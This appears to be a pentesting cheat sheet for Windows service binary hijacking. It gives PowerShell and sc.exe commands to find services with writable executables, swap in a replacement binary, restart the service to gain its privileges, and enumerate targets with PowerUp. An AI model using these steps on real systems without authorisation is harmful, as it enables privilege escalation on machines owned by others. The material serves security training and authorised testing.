# Service binary hijacking

Needs: writable service executable + privileged service account + start/restart trigger.

```powershell
Get-CimInstance -ClassName Win32_Service |
  Select-Object Name,State,StartMode,StartName,PathName
sc.exe qc <SERVICE>
icacls 'C:\Path\To\service.exe'
sc.exe query <SERVICE>
```
- Split executable from arguments in `PathName`; you need `(M)` or `(F)` in the ACL.
- Use `sc.exe` in PowerShell (`sc` is an alias for `Set-Content`).

```powershell
# stop first if running and you have SERVICE_STOP
Copy-Item 'C:\Path\To\service.exe' "$env:TEMP\service.exe.bak"
Copy-Item '.\replacement.exe' 'C:\Path\To\service.exe'
sc.exe start <SERVICE>
```
- Running service must be restarted: `SERVICE_START` ≠ `SERVICE_STOP`.
- Restore afterwards if the service must keep working: `Copy-Item "$env:TEMP\service.exe.bak" 'C:\Path\To\service.exe'`.

PowerUp lead (verify ACL and trigger):
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile
```
